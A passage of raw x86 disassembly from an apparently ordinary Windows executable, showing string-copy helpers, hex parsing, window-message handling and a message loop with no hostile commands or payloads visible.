  404d87:	jbe    0x404d93
  404d89:	cmp    eax,0x3
  404d8c:	je     0x404dc0
  404d8e:	cmp    eax,0x4
  404d91:	jne    0x404db3
  404d93:	lea    eax,[ecx+0x8]
  404d96:	add    eax,esi
  404d98:	push   eax
  404d99:	lea    eax,[ebp-0x2c]
  404d9c:	push   eax
  404d9d:	call   0x405582
  404da2:	test   eax,eax
  404da4:	jne    0x404db3
  404da6:	mov    eax,ds:0x407d38
  404dab:	mov    eax,DWORD PTR [eax+0xc]
  404dae:	and    DWORD PTR [esi+eax*1+0x8],0x0
  404db3:	push   ebx
  404db4:	push   edi
  404db5:	call   DWORD PTR ds:0x409398
  404dbb:	jmp    0x404f16
  404dc0:	xor    esi,esi
  404dc2:	push   esi
  404dc3:	push   esi
  404dc4:	push   0x147
  404dc9:	push   DWORD PTR ds:0x407d70
  404dcf:	call   DWORD PTR ds:0x409370
  404dd5:	test   eax,eax
  404dd7:	jne    0x404def
  404dd9:	mov    ecx,DWORD PTR ds:0x407d7c
  404ddf:	mov    eax,ds:0x407d38
  404de4:	mov    eax,DWORD PTR [eax+0xc]
  404de7:	add    ecx,ecx
  404de9:	mov    DWORD PTR [eax+ecx*8+0x8],esi
  404ded:	jmp    0x404db3
  404def:	mov    esi,DWORD PTR ds:0x407d38
  404df5:	mov    edi,DWORD PTR ds:0x407d7c
  404dfb:	lea    eax,[ebp-0x2c]
  404dfe:	push   eax
  404dff:	mov    eax,DWORD PTR [esi+0xc]
  404e02:	add    edi,edi
  404e04:	push   0x20
  404e06:	push   DWORD PTR [eax+edi*8+0xc]
  404e0a:	call   0x405023
  404e0f:	mov    ecx,DWORD PTR [esi+0xc]
  404e12:	mov    eax,DWORD PTR [ecx+edi*8+0xc]
  404e16:	mov    DWORD PTR [ecx+edi*8+0x8],eax
  404e1a:	mov    edi,DWORD PTR [ebp-0x58]
  404e1d:	jmp    0x404db3
  404e1f:	mov    esi,DWORD PTR ds:0x40939c
  404e25:	push   0x3e8
  404e2a:	push   edi
  404e2b:	call   esi
  404e2d:	push   0x3e9
  404e32:	push   edi
  404e33:	mov    ds:0x407d74,eax
  404e38:	call   esi
  404e3a:	push   0x3f2
  404e3f:	push   edi
  404e40:	mov    ds:0x407d78,eax
  404e45:	call   esi
  404e47:	or     DWORD PTR ds:0x407d7c,0xffffffff
  404e4e:	mov    ds:0x407d70,eax
  404e53:	mov    DWORD PTR ds:0x407d38,ebx
  404e59:	test   ebx,ebx
  404e5b:	je     0x404f16
  404e61:	mov    esi,DWORD PTR ds:0x409358
  404e67:	push   0x5
  404e69:	push   eax
  404e6a:	jmp    0x404e91
  404e6c:	push   0x7
  404e6e:	lea    eax,[ebp-0xc]
  404e71:	push   eax
  404e72:	push   ebx
  404e73:	call   DWORD PTR ds:0x4093b8
  404e79:	lea    eax,[ebp-0xc]
  404e7c:	push   0x401f30
  404e81:	push   eax
  404e82:	call   DWORD PTR ds:0x40940c
  404e88:	pop    ecx
  404e89:	pop    ecx
  404e8a:	test   eax,eax
  404e8c:	je     0x404e99
  404e8e:	push   0x2
  404e90:	push   ebx
  404e91:	call   esi
  404e93:	mov    ebx,eax
  404e95:	test   ebx,ebx
  404e97:	jne    0x404e6c
  404e99:	xor    esi,esi
  404e9b:	push   esi
  404e9c:	push   0x1f
  404e9e:	push   0xc5
  404ea3:	push   ebx
  404ea4:	mov    ebx,DWORD PTR ds:0x409370
  404eaa:	call   ebx
  404eac:	mov    eax,ds:0x407d38
  404eb1:	push   DWORD PTR [eax+0x4]
  404eb4:	push   edi
  404eb5:	call   DWORD PTR ds:0x40932c
  404ebb:	mov    eax,ds:0x407d38
  404ec0:	cmp    DWORD PTR [eax],esi
  404ec2:	jbe    0x404f16
  404ec4:	mov    edi,esi
  404ec6:	mov    eax,DWORD PTR [eax+0xc]
  404ec9:	push   DWORD PTR [eax+edi*1]
  404ecc:	push   0xffffffff
  404ece:	push   0x181
  404ed3:	push   DWORD PTR ds:0x407d74
  404ed9:	call   ebx
  404edb:	mov    eax,ds:0x407d38
  404ee0:	inc    esi
  404ee1:	add    edi,0x10
  404ee4:	cmp    esi,DWORD PTR [eax]
  404ee6:	jb     0x404ec6
  404ee8:	jmp    0x404f16
  404eea:	lea    eax,[ebp-0x4c]
  404eed:	push   eax
  404eee:	push   edi
  404eef:	call   DWORD PTR ds:0x409320
  404ef5:	push   0x1
  404ef7:	call   DWORD PTR ds:0x409250
  404efd:	push   eax
  404efe:	lea    eax,[ebp-0x44]
  404f01:	push   eax
  404f02:	push   DWORD PTR [ebp-0x4c]
  404f05:	call   DWORD PTR ds:0x409350
  404f0b:	lea    eax,[ebp-0x4c]
  404f0e:	push   eax
  404f0f:	push   edi
  404f10:	call   DWORD PTR ds:0x409324
  404f16:	xor    eax,eax
  404f18:	mov    ecx,DWORD PTR [ebp-0x4]
  404f1b:	pop    edi
  404f1c:	pop    esi
  404f1d:	xor    ecx,ebp
  404f1f:	pop    ebx
  404f20:	call   0x405a3a
  404f25:	leave  
  404f26:	ret    0x10
  404f29:	int3   
  404f2a:	int3   
  404f2b:	int3   
  404f2c:	int3   
  404f2d:	int3   
  404f2e:	mov    edi,edi
  404f30:	push   esi
  404f31:	mov    esi,ecx
  404f33:	xor    ecx,ecx
  404f35:	push   edi
  404f36:	mov    edi,eax
  404f38:	test   eax,eax
  404f3a:	je     0x404f48
  404f3c:	cmp    BYTE PTR [esi],cl
  404f3e:	je     0x404f44
  404f40:	inc    esi
  404f41:	dec    eax
  404f42:	jne    0x404f3c
  404f44:	test   eax,eax
  404f46:	jne    0x404f4d
  404f48:	mov    ecx,0x80070057
  404f4d:	test   edx,edx
  404f4f:	je     0x404f5e
  404f51:	test   ecx,ecx
  404f53:	js     0x404f5b
  404f55:	sub    edi,eax
  404f57:	mov    DWORD PTR [edx],edi
  404f59:	jmp    0x404f5e
  404f5b:	and    DWORD PTR [edx],0x0
  404f5e:	pop    edi
  404f5f:	mov    eax,ecx
  404f61:	pop    esi
  404f62:	ret    
  404f63:	int3   
  404f64:	int3   
  404f65:	int3   
  404f66:	int3   
  404f67:	int3   
  404f68:	mov    edi,edi
  404f6a:	push   ebp
  404f6b:	mov    ebp,esp
  404f6d:	push   ecx
  404f6e:	push   ebx
  404f6f:	push   esi
  404f70:	mov    ebx,eax
  404f72:	mov    eax,DWORD PTR [ebp+0x8]
  404f75:	xor    esi,esi
  404f77:	xor    edx,edx
  404f79:	push   edi
  404f7a:	mov    edi,DWORD PTR [ebp+0xc]
  404f7d:	mov    DWORD PTR [ebp-0x4],esi
  404f80:	test   eax,eax
  404f82:	je     0x404fb2
  404f84:	sub    DWORD PTR [ebp+0x10],ecx
  404f87:	mov    esi,DWORD PTR [ebp+0x10]
  404f8a:	test   ebx,ebx
  404f8c:	je     0x404fab
  404f8e:	mov    al,BYTE PTR [esi+ecx*1]
  404f91:	test   al,al
  404f93:	mov    eax,DWORD PTR [ebp+0x8]
  404f96:	je     0x404fab
  404f98:	mov    al,BYTE PTR [esi+ecx*1]
  404f9b:	mov    BYTE PTR [ecx],al
  404f9d:	mov    eax,DWORD PTR [ebp+0x8]
  404fa0:	inc    ecx
  404fa1:	dec    eax
  404fa2:	dec    ebx
  404fa3:	inc    edx
  404fa4:	mov    DWORD PTR [ebp+0x8],eax
  404fa7:	test   eax,eax
  404fa9:	jne    0x404f8a
  404fab:	mov    esi,DWORD PTR [ebp-0x4]
  404fae:	test   eax,eax
  404fb0:	jne    0x404fb9
  404fb2:	dec    ecx
  404fb3:	dec    edx
  404fb4:	mov    esi,0x8007007a
  404fb9:	mov    BYTE PTR [ecx],0x0
  404fbc:	test   edi,edi
  404fbe:	je     0x404fc2
  404fc0:	mov    DWORD PTR [edi],edx
  404fc2:	pop    edi
  404fc3:	mov    eax,esi
  404fc5:	pop    esi
  404fc6:	pop    ebx
  404fc7:	leave  
  404fc8:	ret    0xc
  404fcb:	int3   
  404fcc:	int3   
  404fcd:	int3   
  404fce:	int3   
  404fcf:	int3   
  404fd0:	mov    edi,edi
  404fd2:	push   ebp
  404fd3:	mov    ebp,esp
  404fd5:	push   ebx
  404fd6:	push   esi
  404fd7:	push   DWORD PTR [ebp+0x10]
  404fda:	lea    esi,[eax-0x1]
  404fdd:	push   DWORD PTR [ebp+0xc]
  404fe0:	xor    ebx,ebx
  404fe2:	push   esi
  404fe3:	push   DWORD PTR [ebp+0x8]
  404fe6:	call   DWORD PTR ds:0x409404
  404fec:	add    esp,0x10
  404fef:	test   eax,eax
  404ff1:	js     0x405005
  404ff3:	cmp    eax,esi
  404ff5:	ja     0x405005
  404ff7:	jne    0x405001
  404ff9:	mov    eax,DWORD PTR [ebp+0x8]
  404ffc:	mov    BYTE PTR [esi+eax*1],bl
  404fff:	jmp    0x405010
  405001:	mov    esi,eax
  405003:	jmp    0x405010
  405005:	mov    eax,DWORD PTR [ebp+0x8]
  405008:	mov    BYTE PTR [esi+eax*1],bl
  40500b:	mov    ebx,0x8007007a
  405010:	test   edi,edi
  405012:	je     0x405016
  405014:	mov    DWORD PTR [edi],esi
  405016:	pop    esi
  405017:	mov    eax,ebx
  405019:	pop    ebx
  40501a:	pop    ebp
  40501b:	ret    0xc
  40501e:	int3   
  40501f:	int3   
  405020:	int3   
  405021:	int3   
  405022:	int3   
  405023:	mov    edi,edi
  405025:	push   ebp
  405026:	mov    ebp,esp
  405028:	mov    eax,DWORD PTR [ebp+0xc]
  40502b:	xor    ecx,ecx
  40502d:	test   eax,eax
  40502f:	je     0x405038
  405031:	cmp    eax,0x7fffffff
  405036:	jbe    0x40503d
  405038:	mov    ecx,0x80070057
  40503d:	test   ecx,ecx
  40503f:	js     0x405058
  405041:	push   DWORD PTR [ebp+0x10]
  405044:	mov    ecx,DWORD PTR [ebp+0x8]
  405047:	push   0x0
  405049:	push   eax
  40504a:	mov    eax,0x7ffffffe
  40504f:	call   0x404f68
  405054:	mov    ecx,eax
  405056:	jmp    0x405062
  405058:	test   eax,eax
  40505a:	je     0x405062
  40505c:	mov    eax,DWORD PTR [ebp+0x8]
  40505f:	mov    BYTE PTR [eax],0x0
  405062:	mov    eax,ecx
  405064:	pop    ebp
  405065:	ret    0xc
  405068:	int3   
  405069:	int3   
  40506a:	int3   
  40506b:	int3   
  40506c:	int3   
  40506d:	mov    edi,edi
  40506f:	push   ebp
  405070:	mov    ebp,esp
  405072:	push   esi
  405073:	mov    esi,DWORD PTR [ebp+0xc]
  405076:	xor    eax,eax
  405078:	push   edi
  405079:	test   esi,esi
  40507b:	je     0x405085
  40507d:	cmp    esi,0x7fffffff
  405083:	jbe    0x40508a
  405085:	mov    eax,0x80070057
  40508a:	mov    edi,DWORD PTR [ebp+0x8]
  40508d:	test   eax,eax
  40508f:	js     0x4050a2
  405091:	lea    edx,[ebp+0xc]
  405094:	mov    eax,esi
  405096:	mov    ecx,edi
  405098:	call   0x404f2e
  40509d:	mov    ecx,DWORD PTR [ebp+0xc]
  4050a0:	jmp    0x4050a4
  4050a2:	xor    ecx,ecx
  4050a4:	test   eax,eax
  4050a6:	js     0x4050bc
  4050a8:	push   DWORD PTR [ebp+0x10]
  4050ab:	sub    esi,ecx
  4050ad:	push   0x0
  4050af:	push   esi
  4050b0:	add    ecx,edi
  4050b2:	mov    eax,0x7ffffffe
  4050b7:	call   0x404f68
  4050bc:	pop    edi
  4050bd:	pop    esi
  4050be:	pop    ebp
  4050bf:	ret    0xc
  4050c2:	int3   
  4050c3:	int3   
  4050c4:	int3   
  4050c5:	int3   
  4050c6:	int3   
  4050c7:	mov    edi,edi
  4050c9:	push   ebp
  4050ca:	mov    ebp,esp
  4050cc:	mov    eax,DWORD PTR [ebp+0xc]
  4050cf:	xor    ecx,ecx
  4050d1:	test   eax,eax
  4050d3:	je     0x4050dc
  4050d5:	cmp    eax,0x7fffffff
  4050da:	jbe    0x4050e1
  4050dc:	mov    ecx,0x80070057
  4050e1:	test   ecx,ecx
  4050e3:	js     0x4050fb
  4050e5:	push   edi
  4050e6:	push   DWORD PTR [ebp+0x14]
  4050e9:	xor    edi,edi
  4050eb:	push   DWORD PTR [ebp+0x10]
  4050ee:	push   DWORD PTR [ebp+0x8]
  4050f1:	call   0x404fd0
  4050f6:	mov    ecx,eax
  4050f8:	pop    edi
  4050f9:	jmp    0x405105
  4050fb:	test   eax,eax
  4050fd:	je     0x405105
  4050ff:	mov    eax,DWORD PTR [ebp+0x8]
  405102:	mov    BYTE PTR [eax],0x0
  405105:	mov    eax,ecx
  405107:	pop    ebp
  405108:	ret    0x10
  40510b:	int3   
  40510c:	int3   
  40510d:	int3   
  40510e:	int3   
  40510f:	int3   
  405110:	mov    edi,edi
  405112:	push   ebp
  405113:	mov    ebp,esp
  405115:	mov    eax,DWORD PTR [ebp+0xc]
  405118:	xor    ecx,ecx
  40511a:	test   eax,eax
  40511c:	je     0x405125
  40511e:	cmp    eax,0x7fffffff
  405123:	jbe    0x40512a
  405125:	mov    ecx,0x80070057
  40512a:	test   ecx,ecx
  40512c:	js     0x405145
  40512e:	push   edi
  40512f:	lea    ecx,[ebp+0x14]
  405132:	push   ecx
  405133:	push   DWORD PTR [ebp+0x10]
  405136:	xor    edi,edi
  405138:	push   DWORD PTR [ebp+0x8]
  40513b:	call   0x404fd0
  405140:	mov    ecx,eax
  405142:	pop    edi
  405143:	jmp    0x40514f
  405145:	test   eax,eax
  405147:	je     0x40514f
  405149:	mov    eax,DWORD PTR [ebp+0x8]
  40514c:	mov    BYTE PTR [eax],0x0
  40514f:	mov    eax,ecx
  405151:	pop    ebp
  405152:	ret    
  405153:	int3   
  405154:	int3   
  405155:	int3   
  405156:	int3   
  405157:	int3   
  405158:	push   0x50
  40515a:	push   0x4063f8
  40515f:	call   0x405ab0
  405164:	push   0x4017f8
  405169:	call   0x40457b
  40516e:	mov    DWORD PTR [esp],0x401810
  405175:	xor    ebx,ebx
  405177:	push   ebx
  405178:	push   ebx
  405179:	push   ebx
  40517a:	call   DWORD PTR ds:0x409294
  405180:	mov    DWORD PTR [ebp-0x54],eax
  405183:	push   0xfffffffe
  405185:	pop    edi
  405186:	xor    esi,esi
  405188:	inc    esi
  405189:	mov    DWORD PTR ds:0x407d34,ebx
  40518f:	push   ebx
  405190:	push   0x3ed
  405195:	push   DWORD PTR ds:0x408128
  40519b:	call   DWORD PTR ds:0x40939c
  4051a1:	push   eax
  4051a2:	call   DWORD PTR ds:0x4093a4
  4051a8:	push   ebx
  4051a9:	push   0x3ee
  4051ae:	push   DWORD PTR ds:0x408128
  4051b4:	call   DWORD PTR ds:0x40939c
  4051ba:	push   eax
  4051bb:	call   DWORD PTR ds:0x4093a4
  4051c1:	mov    DWORD PTR [ebp-0x3c],ebx
  4051c4:	mov    BYTE PTR [ebp-0x38],bl
  4051c7:	lea    eax,[ebp-0x3c]
  4051ca:	push   eax
  4051cb:	push   ebx
  4051cc:	push   0x40181c
  4051d1:	lea    eax,[ebp-0x38]
  4051d4:	push   eax
  4051d5:	push   0x401824
  4051da:	push   ebx
  4051db:	call   DWORD PTR ds:0x4092ec
  4051e1:	test   eax,eax
  4051e3:	je     0x4051f1
  4051e5:	lea    ecx,[ebp-0x38]
  4051e8:	push   ecx
  4051e9:	push   eax
  4051ea:	push   0x40182c
  4051ef:	jmp    0x40520c
  4051f1:	push   0x4080ec
  4051f6:	push   DWORD PTR [ebp-0x3c]
  4051f9:	call   DWORD PTR ds:0x4092fc
  4051ff:	test   eax,eax
  405201:	je     0x405214
  405203:	push   DWORD PTR [ebp-0x3c]
  405206:	push   eax
  405207:	push   0x401864
  40520c:	call   0x40457b
  405211:	add    esp,0xc
  405214:	lea    eax,[ebp-0x3c]
  405217:	push   eax
  405218:	call   DWORD PTR ds:0x4092f0
  40521e:	push   0x4018a0
  405223:	call   0x40457b
  405228:	pop    ecx
  405229:	push   0xffffffff
  40522b:	push   DWORD PTR [ebp-0x54]
  40522e:	call   DWORD PTR ds:0x409298
  405234:	mov    DWORD PTR [ebp-0x4],ebx
  405237:	lea    eax,[ebp-0x58]
  40523a:	push   eax
  40523b:	lea    eax,[ebp-0x5c]
  40523e:	push   eax
  40523f:	lea    eax,[ebp-0x60]
  405242:	push   eax
  405243:	call   DWORD PTR ds:0x409290
  405249:	push   eax
  40524a:	call   0x4055df
  40524f:	mov    DWORD PTR [ebp-0x4],edi
  405252:	mov    DWORD PTR ds:0x407d34,esi
  405258:	call   0x404340
  40525d:	mov    DWORD PTR ds:0x40813c,ebx
  405263:	push   ebx
  405264:	push   0x9c58
  405269:	push   DWORD PTR ds:0x4080f8
  40526f:	call   DWORD PTR ds:0x409318
  405275:	push   0x401924
  40527a:	call   0x40457b
  40527f:	pop    ecx
  405280:	mov    DWORD PTR ds:0x4080f0,ebx
  405286:	push   esi
  405287:	push   0x3ed
  40528c:	push   DWORD PTR ds:0x408128
  405292:	call   DWORD PTR ds:0x40939c
  405298:	push   eax
  405299:	call   DWORD PTR ds:0x4093a4
  40529f:	push   esi
  4052a0:	push   0x3ee
  4052a5:	push   DWORD PTR ds:0x408128
  4052ab:	call   DWORD PTR ds:0x40939c
  4052b1:	push   eax
  4052b2:	call   DWORD PTR ds:0x4093a4
  4052b8:	mov    DWORD PTR [ebp-0x3c],0x4b0
  4052bf:	push   0x4b0
  4052c4:	call   0x4045da
  4052c9:	mov    esi,eax
  4052cb:	mov    DWORD PTR [ebp-0x50],esi
  4052ce:	test   esi,esi
  4052d0:	je     0x4053a0
  4052d6:	push   0xffffffff
  4052d8:	push   ebx
  4052d9:	lea    eax,[ebp-0x60]
  4052dc:	push   eax
  4052dd:	push   0x3
  4052df:	call   DWORD PTR ds:0x409280
  4052e5:	dec    eax
  4052e6:	je     0x405417
  4052ec:	dec    eax
  4052ed:	je     0x4053b0
  4052f3:	push   0x4080ec
  4052f8:	call   DWORD PTR ds:0x4092e8
  4052fe:	call   0x404399
  405303:	push   DWORD PTR [ebp-0x60]
  405306:	call   DWORD PTR ds:0x4092a8
  40530c:	push   DWORD PTR [ebp-0x5c]
  40530f:	call   DWORD PTR ds:0x4092a8
  405315:	push   DWORD PTR [ebp-0x58]
  405318:	call   DWORD PTR ds:0x4092a8
  40531e:	push   esi
  40531f:	call   DWORD PTR ds:0x40927c
  405325:	push   ebx
  405326:	push   ebx
  405327:	push   0x184
  40532c:	push   DWORD PTR ds:0x408124
  405332:	call   DWORD PTR ds:0x409370
  405338:	mov    eax,ds:0x4080f0
  40533d:	test   eax,eax
  40533f:	je     0x405356
  405341:	mov    esi,DWORD PTR [eax+0x1c]
  405344:	push   eax
  405345:	call   DWORD PTR ds:0x40927c
  40534b:	mov    eax,esi
  40534d:	mov    ds:0x4080f0,eax
  405352:	test   esi,esi
  405354:	jne    0x405341
  405356:	xor    esi,esi
  405358:	inc    esi
  405359:	push   esi
  40535a:	push   0x9c58
  40535f:	push   DWORD PTR ds:0x4080f8
  405365:	call   DWORD PTR ds:0x409318
  40536b:	push   esi
  40536c:	push   0x9c59
  405371:	push   DWORD PTR ds:0x4080f8
  405377:	call   DWORD PTR ds:0x409318
  40537d:	cmp    DWORD PTR ds:0x408138,0x0
  405384:	je     0x405189
  40538a:	mov    DWORD PTR ds:0x407d34,ebx
  405390:	push   ebx
  405391:	push   ebx
  405392:	push   0x10
  405394:	push   DWORD PTR ds:0x408128
  40539a:	call   DWORD PTR ds:0x409374
  4053a0:	push   DWORD PTR [ebp-0x54]
  4053a3:	call   DWORD PTR ds:0x4092a8
  4053a9:	push   ebx
  4053aa:	call   DWORD PTR ds:0x409268
  4053b0:	mov    eax,DWORD PTR [ebp-0x3c]
  4053b3:	mov    DWORD PTR [ebp-0x4c],eax
  4053b6:	mov    DWORD PTR [ebp-0x4],0x2
  4053bd:	lea    eax,[ebp-0x4c]
  4053c0:	push   eax
  4053c1:	push   esi
  4053c2:	call   0x4056a1
  4053c7:	mov    DWORD PTR [ebp-0x4],edi
  4053ca:	mov    eax,DWORD PTR [ebp-0x4c]
  4053cd:	xor    edx,edx
  4053cf:	push   0x18
  4053d1:	pop    ecx
  4053d2:	div    ecx
  4053d4:	mov    ecx,eax
  4053d6:	mov    DWORD PTR [ebp-0x44],ecx
  4053d9:	mov    eax,esi
  4053db:	test   ecx,ecx
  4053dd:	je     0x4053f3
  4053df:	push   eax
  4053e0:	add    eax,0x18
  4053e3:	mov    DWORD PTR [ebp-0x40],eax
  4053e6:	call   0x403e28
  4053eb:	dec    DWORD PTR [ebp-0x44]
  4053ee:	mov    eax,DWORD PTR [ebp-0x40]
  4053f1:	jne    0x4053df
  4053f3:	mov    eax,DWORD PTR [ebp-0x3c]
  4053f6:	cmp    DWORD PTR [ebp-0x4c],eax
  4053f9:	je     0x4053b3
  4053fb:	jmp    0x4052d6
  405400:	mov    eax,DWORD PTR [ebp-0x14]
  405403:	mov    eax,DWORD PTR [eax]
  405405:	push   DWORD PTR [eax]
  405407:	call   0x4063ba
  40540c:	ret    
  40540d:	mov    esp,DWORD PTR [ebp-0x18]
  405410:	push   0x4019a0
  405415:	jmp    0x40548f
  405417:	mov    eax,DWORD PTR [ebp-0x3c]
  40541a:	dec    eax
  40541b:	mov    DWORD PTR [ebp-0x40],eax
  40541e:	mov    DWORD PTR [ebp-0x48],eax
  405421:	mov    DWORD PTR [ebp-0x4],0x1
  405428:	lea    eax,[ebp-0x48]
  40542b:	push   eax
  40542c:	push   esi
  40542d:	call   0x40567d
  405432:	mov    DWORD PTR [ebp-0x4],edi
  405435:	mov    eax,DWORD PTR [ebp-0x48]
  405438:	mov    BYTE PTR [eax+esi*1],bl
  40543b:	push   esi
  40543c:	call   0x404531
  405441:	mov    eax,DWORD PTR [ebp-0x40]
  405444:	cmp    DWORD PTR [ebp-0x48],eax
  405447:	jne    0x4052d6
  40544d:	mov    eax,DWORD PTR [ebp-0x3c]
  405450:	add    eax,eax
  405452:	mov    DWORD PTR [ebp-0x44],eax
  405455:	push   eax
  405456:	call   0x4045da
  40545b:	mov    DWORD PTR [ebp-0x40],eax
  40545e:	test   eax,eax
  405460:	mov    eax,DWORD PTR [ebp-0x3c]
  405463:	je     0x40541a
  405465:	push   esi
  405466:	call   DWORD PTR ds:0x40927c
  40546c:	mov    esi,DWORD PTR [ebp-0x40]
  40546f:	mov    DWORD PTR [ebp-0x50],esi
  405472:	mov    eax,DWORD PTR [ebp-0x44]
  405475:	mov    DWORD PTR [ebp-0x3c],eax
  405478:	jmp    0x40541a
  40547a:	mov    eax,DWORD PTR [ebp-0x14]
  40547d:	mov    eax,DWORD PTR [eax]
  40547f:	push   DWORD PTR [eax]
  405481:	call   0x4063ba
  405486:	ret    
  405487:	mov    esp,DWORD PTR [ebp-0x18]
  40548a:	push   0x401960
  40548f:	call   0x40457b
  405494:	pop    ecx
  405495:	push   0xfffffffe
  405497:	pop    edi
  405498:	mov    DWORD PTR [ebp-0x4],edi
  40549b:	xor    ebx,ebx
  40549d:	mov    esi,DWORD PTR [ebp-0x50]
  4054a0:	jmp    0x4052d6
  4054a5:	mov    eax,DWORD PTR [ebp-0x14]
  4054a8:	mov    eax,DWORD PTR [eax]
  4054aa:	push   DWORD PTR [eax]
  4054ac:	call   0x4063ba
  4054b1:	ret    
  4054b2:	mov    esp,DWORD PTR [ebp-0x18]
  4054b5:	push   0x4018d0
  4054ba:	call   0x40457b
  4054bf:	pop    ecx
  4054c0:	push   0xfffffffe
  4054c2:	pop    edi
  4054c3:	mov    DWORD PTR [ebp-0x4],edi
  4054c6:	xor    ebx,ebx
  4054c8:	jmp    0x405186
  4054cd:	int3   
  4054ce:	int3   
  4054cf:	int3   
  4054d0:	int3   
  4054d1:	int3   
  4054d2:	mov    edi,edi
  4054d4:	push   ebp
  4054d5:	mov    ebp,esp
  4054d7:	sub    esp,0x48
  4054da:	mov    eax,ds:0x407a10
  4054df:	xor    eax,ebp
  4054e1:	mov    DWORD PTR [ebp-0x4],eax
  4054e4:	push   ebx
  4054e5:	mov    ebx,DWORD PTR [ebp+0x8]
  4054e8:	push   esi
  4054e9:	mov    esi,DWORD PTR [ebp+0xc]
  4054ec:	push   edi
  4054ed:	push   0x0
  4054ef:	push   0x0
  4054f1:	push   0x184
  4054f6:	push   0x3f7
  4054fb:	push   ebx
  4054fc:	call   DWORD PTR ds:0x4093bc
  405502:	xor    edi,edi
  405504:	and    DWORD PTR [ebp-0x48],edi
  405507:	mov    ecx,DWORD PTR [esi]
  405509:	test   ecx,ecx
  40550b:	je     0x405563
  40550d:	mov    eax,DWORD PTR [esi+0x8]
  405510:	push   DWORD PTR [eax*8+0x40706c]
  405517:	lea    eax,[ebp-0x44]
  40551a:	push   DWORD PTR [esi+0x4]
  40551d:	push   DWORD PTR [ecx*8+0x40700c]
  405524:	push   0x401e40
  405529:	push   0x40
  40552b:	push   eax
  40552c:	call   0x405110
  405531:	add    esp,0x18
  405534:	lea    eax,[ebp-0x44]
  405537:	push   eax
  405538:	push   0x0
  40553a:	push   0x180
  40553f:	push   0x3f7
  405544:	push   ebx
  405545:	call   DWORD PTR ds:0x4093bc
  40554b:	push   edi
  40554c:	push   DWORD PTR [ebp-0x48]
  40554f:	push   0x19a
  405554:	push   0x3f7
  405559:	push   ebx
  40555a:	call   DWORD PTR ds:0x4093bc
  405560:	inc    DWORD PTR [ebp-0x48]
  405563:	inc    edi
  405564:	add    esi,0xc
  405567:	cmp    edi,0x2
  40556a:	jl     0x405507
  40556c:	mov    ecx,DWORD PTR [ebp-0x4]
  40556f:	pop    edi
  405570:	pop    esi
  405571:	xor    ecx,ebp
  405573:	pop    ebx
  405574:	call   0x405a3a
  405579:	leave  
  40557a:	ret    0x8
  40557d:	int3   
  40557e:	int3   
  40557f:	int3   
  405580:	int3   
  405581:	int3   
  405582:	mov    edi,edi
  405584:	push   ebp
  405585:	mov    ebp,esp
  405587:	push   esi
  405588:	push   edi
  405589:	mov    edi,DWORD PTR [ebp+0x8]
  40558c:	mov    cl,BYTE PTR [edi]
  40558e:	xor    esi,esi
  405590:	mov    edx,esi
  405592:	test   cl,cl
  405594:	je     0x4055d2
  405596:	lea    eax,[ecx-0x30]
  405599:	cmp    al,0x9
  40559b:	ja     0x4055a1
  40559d:	mov    cl,al
  40559f:	jmp    0x4055b7
  4055a1:	lea    eax,[ecx-0x61]
  4055a4:	cmp    al,0x5
  4055a6:	ja     0x4055ad
  4055a8:	add    cl,0xa9
  4055ab:	jmp    0x4055b7
  4055ad:	lea    eax,[ecx-0x41]
  4055b0:	cmp    al,0x5
  4055b2:	ja     0x4055c9
  4055b4:	add    cl,0xc9
  4055b7:	movsx  eax,cl
  4055ba:	xor    esi,esi
  4055bc:	shl    edx,0x4
  4055bf:	inc    esi
  4055c0:	add    edx,eax
  4055c2:	inc    edi
  4055c3:	mov    cl,BYTE PTR [edi]
  4055c5:	test   cl,cl
  4055c7:	jne    0x405596
  4055c9:	test   esi,esi
  4055cb:	je     0x4055d2
  4055cd:	mov    ecx,DWORD PTR [ebp+0xc]
  4055d0:	mov    DWORD PTR [ecx],edx
  4055d2:	pop    edi
  4055d3:	mov    eax,esi
  4055d5:	pop    esi
  4055d6:	pop    ebp
  4055d7:	ret    0x8
  4055da:	int3   
  4055db:	int3   
  4055dc:	int3   
  4055dd:	int3   
  4055de:	int3   
  4055df:	mov    edi,edi
  4055e1:	push   ebp
  4055e2:	mov    ebp,esp
  4055e4:	push   ecx
  4055e5:	lea    eax,[ebp+0x8]
  4055e8:	push   eax
  4055e9:	push   0x401fea
  4055ee:	push   0x402190
  4055f3:	call   0x4063c6
  4055f8:	add    esp,0xc
  4055fb:	mov    DWORD PTR [ebp-0x4],eax
  4055fe:	mov    eax,DWORD PTR [ebp-0x4]
  405601:	leave  
  405602:	ret    0x10
  405605:	int3   
  405606:	int3   
  405607:	int3   
  405608:	int3   
  405609:	int3   
  40560a:	mov    edi,edi
  40560c:	push   ebp
  40560d:	mov    ebp,esp
  40560f:	lea    eax,[ebp+0x8]
  405612:	push   eax
  405613:	push   0x402020
  405618:	push   0x402190
  40561d:	call   0x4063c6
  405622:	add    esp,0xc
  405625:	pop    ebp
  405626:	ret    0x8
  405629:	int3   
  40562a:	int3   
  40562b:	int3   
  40562c:	int3   
  40562d:	int3   
  40562e:	mov    edi,edi
  405630:	push   ebp
  405631:	mov    ebp,esp
  405633:	lea    eax,[ebp+0x8]
  405636:	push   eax
  405637:	push   0x402044
  40563c:	push   0x402190
  405641:	call   0x4063c6
  405646:	add    esp,0xc
  405649:	pop    ebp
  40564a:	ret    0x8
  40564d:	int3   
  40564e:	int3   
  40564f:	int3   
  405650:	int3   
  405651:	int3   
  405652:	mov    edi,edi
  405654:	push   ebp
  405655:	mov    ebp,esp
  405657:	push   ecx
  405658:	lea    eax,[ebp+0x8]
  40565b:	push   eax
  40565c:	push   0x402068
  405661:	push   0x402190
  405666:	call   0x4063c6
  40566b:	add    esp,0xc
  40566e:	mov    DWORD PTR [ebp-0x4],eax
  405671:	mov    eax,DWORD PTR [ebp-0x4]
  405674:	leave  
  405675:	ret    0x18
  405678:	int3   
  405679:	int3   
  40567a:	int3   
  40567b:	int3   
  40567c:	int3   
  40567d:	mov    edi,edi
  40567f:	push   ebp
  405680:	mov    ebp,esp
  405682:	lea    eax,[ebp+0x8]
  405685:	push   eax
  405686:	push   0x4020aa
  40568b:	push   0x402190
  405690:	call   0x4063c6
  405695:	add    esp,0xc
  405698:	pop    ebp
  405699:	ret    0x8
  40569c:	int3   
  40569d:	int3   
  40569e:	int3   
  40569f:	int3   
  4056a0:	int3   
  4056a1:	mov    edi,edi
  4056a3:	push   ebp
  4056a4:	mov    ebp,esp
  4056a6:	lea    eax,[ebp+0x8]
  4056a9:	push   eax
  4056aa:	push   0x4020ce
  4056af:	push   0x402190
  4056b4:	call   0x4063c6
